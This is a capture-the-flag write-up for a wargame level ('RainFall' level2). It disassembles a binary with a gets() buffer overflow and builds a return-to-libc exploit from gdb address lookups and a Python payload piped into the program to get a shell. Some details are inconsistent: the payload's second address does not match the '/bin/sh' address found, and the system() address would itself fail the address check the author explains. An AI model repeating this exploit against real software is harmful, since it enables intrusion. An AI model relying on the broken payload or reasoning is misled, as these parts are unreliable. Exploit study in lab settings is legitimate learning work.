## Basic examination
There is a single executable **level2**. We run it:
~~~bash
./level2
42 let me pass
42 let me pass
~~~
As we can see,it waits for a stdin input and than prints it. Let's examine the function.

## Assembly dump analysis
As usual, we run **gdb** for a assembly dump for main:
~~~assembly
    0x0804853f <+0>:	push   %ebp
   0x08048540 <+1>:	mov    %esp,%ebp
   0x08048542 <+3>:	and    $0xfffffff0,%esp
   0x08048545 <+6>:	call   0x80484d4 <p>  <-- calls function p() and returns 0
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
~~~
As we can see, it just call one function and returns, so the printing must happen in **p()** function. Let's analyze:
~~~assembly
   0x080484d4 <+0>:	push   %ebp
   0x080484d5 <+1>:	mov    %esp,%ebp
   0x080484d7 <+3>:	sub    $0x68,%esp
   0x080484da <+6>:	mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>    <-- vulnerable gets() again, like in previous level
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
~~~
We can see there is a buffer overflow vulnerable function **gets()** again, but this time there is no system call thant will let us further. So we must think about the way how to force the execution of what we need. We can use **Ghidra** that will help us understand a little more about p() function with its decompile abilities.
~~~C
void p(void)
{
  void *unaff_retaddr;   //uninitiated void pointer, from the name we can assume it is for storing return address. 
  char local_50 [76];
  
  fflush(stdout);
  gets(local_50);
  if (((uint)unaff_retaddr & 0xb0000000) == 0xb0000000) {             //casted as unsigned int (4 bytes), comparing the return address with bitwise AND with 0xb0000000
    printf("(%p)\n",unaff_retaddr);                                   //if true, prints it and exits with 1.
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
}
~~~
We can already see that the program is **allocating 80 bytes, 76 for the string and 4 bytes for uint variable (4 bytes on 32 bit systems)**. From what we already know about **stack frame** for program execution, this will be our potential offset for force execution of what we might need on the place of the return memory address. **BUT!** this code is little wittier, as the return address comparation here is effectivelly blocking the classical buffer overflow. Why? Read the stuff [HERE](https://unix.stackexchange.com/questions/509607/how-a-64-bit-process-virtual-address-space-is-divided-in-linux). As we can see, 0xbf****** address ranges are historically associated with user memory on 32 bit x86 systems - the stack, in other words. So, the code above is blocking the execution of the return memory addresses located on the stack, exiting the flow when it finds such. Fortunatelly, there is also a **heap**...

## Return to libc
We will use the [**return to libc**](https://en.wikipedia.org/wiki/Return-to-libc_attack) type of attack that is not utiliying the stack but rather works with stuff already in process memory. We construct the attack using this flow
~~~
overflow on offset -> mem address of system() -> mem address of "/bin/sh"
~~~
Using gdb's brakepoint, we will find what we need:
~~~bash
(gdb) b p
Breakpoint 1 at 0x80484da
(gdb) r
Starting program: /home/user/level2/level2 

Breakpoint 1, 0x080484da in p ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) find 0xb7e6b060, +9999999, "/bin/sh"
0xb7f8cc58
~~~
Now we use this to construct the attack:
~~~bash
level2@RainFall:~$ python -c 'print "F" * 80  + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1]' > /tmp/flag2
level2@RainFall:~$ cat /tmp/flag2 - | ./level2
~~~


